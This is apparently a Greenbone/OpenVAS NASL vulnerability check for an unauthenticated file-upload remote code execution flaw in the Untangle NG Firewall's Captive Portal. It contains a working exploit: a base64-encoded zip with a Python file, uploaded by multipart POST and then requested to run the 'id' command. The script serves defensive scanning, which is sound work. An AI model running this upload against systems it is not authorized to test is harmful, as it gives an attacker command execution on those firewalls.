# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:untangle:ng-firewall";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105812");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Untangle NG Firewall RCE Vulnerability");

  script_tag(name:"vuldetect", value:"Upload a python file within a zip file and try to execute it.");

  script_tag(name:"insight", value:"The Untangle NG Firewall appliance includes a free module called 'Captive Portal'.
  This module is installed by default with several other recommended modules. The component does not check if the user
  is authenticated before processing the upload. It results in an arbitrary file upload vulnerability, which allows
  remote unauthenticated users to write custom python/HTML files to a known folder.");

  script_tag(name:"summary", value:"The remote Untangle NG Firewall is prone to a remote command
  execution (RCE) vulnerability.");

  script_tag(name:"solution_type", value:"Workaround");

  script_tag(name:"solution", value:"Disable/Remove the Captive Portal module.");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/2724");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2016-07-18 15:16:18 +0200 (Mon, 18 Jul 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_untangle_web_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("untangle/installed");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

function check( i, zip, vt_string )
{

  bound = '---------------------------' + vt_string + '_' + rand();

  data = '--' + bound + '\r\n' +
         'Content-Disposition: form-data; name="upload_file"; filename="custom.zip"\r\n' +
         'Content-Type: application/unknown\r\n' +
         '\r\n' +
         zip +
         '\r\n' +
         '--' +  bound + '\r\n' +
         'Content-Disposition: form-data; name="appid"\r\n' +
         '\r\n' +
         i +
         '\r\n' +
         '--' + bound + '\r\n' +
         'Content-Disposition: form-data; name="filename"\r\n' +
         '\r\n' +
         'custom.py\r\n' +
         '--' + bound + '--\r\n';

  req = http_post_put_req( port:port,
                       url:"/capture/handler.py/custom_upload",
                       data:data,
                       add_headers: make_array( "Content-Type", "multipart/form-data; boundary=" + bound ) );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
  if( 'success:true' >< buf )
  {
    url = '/capture/custom_' + i + '/custom.py';
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( buf =~ 'uid=[0-9]+.*gid=[0-9]+' )
    {
      report = 'It was possible to upload a python file and to execute the `id` command.\n\n';
      report += http_report_vuln_url( port:port, url:'/capture/handler.py/custom_upload');
      report += '\nVulnerable appid: ' + i + '\n' ;
      report += '\nOutput:\n' + buf;
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

zip = 'UEsDBBQAAAAIAPZw8kggohT+hAAAALkAAAAJABwAY3VzdG9tLnB5VVQJAAOQxoxXPsaMV3V4CwAB' +
      'BOgDAAAEZAAAAG2MywrCMBBF9/mKS7toixD3ggsR3Qoq7ouZlEDzcDoB/XtTgjtnc5mZc0+LS6Lw' +
      'ONxwPZ5wp0VwdjMp51NkwTN6PwazKNXCcvSY4xSzbGvo9FGGLFww9O6ZXsNOYZ0wesIe5aJtsa1r' +
      'ffx8eiIpgpSlR8ceHTa1NFSOSTKHv3jjTFOwL1BLAQIeAxQAAAAIAPZw8kggohT+hAAAALkAAAAJ' +
      'ABgAAAAAAAEAAACkgQAAAABjdXN0b20ucHlVVAUAA5DGjFd1eAsAAQToAwAABGQAAABQSwUGAAAA' +
      'AAEAAQBPAAAAxwAAAAAA';

zip = base64_decode( str:zip );
vtstrings = get_vt_strings();

for( i = 1; i < 35; i++ )
  check( i:i, zip:zip, vt_string:vtstrings["default"] );

exit( 99 );
